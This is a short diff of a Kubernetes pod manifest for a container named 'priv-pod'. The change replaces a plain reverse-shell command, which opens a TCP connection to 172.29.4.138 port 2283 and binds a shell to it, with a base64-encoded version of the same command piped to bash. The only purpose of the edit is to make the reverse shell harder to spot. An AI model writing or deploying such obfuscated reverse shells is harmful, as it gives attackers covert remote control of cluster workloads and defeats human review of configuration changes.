@@ -39,4 +39,4 @@ spec:
   - name: priv-pod
     image: r0binak/mtkpi:v1.5
     command: [ "/bin/sh", "-c", "--" ]
-    args: [ "0<&196;exec 196<>/dev/tcp/172.29.4.138/2283; sh <&196 >&196 2>&196" ]
+    args: [ "echo MDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xNzIuMjkuNC4xMzgvMjI4Mzsgc2ggPCYxOTYgPiYxOTYgMj4mMTk2 | base64 -d | /bin/bash" ]
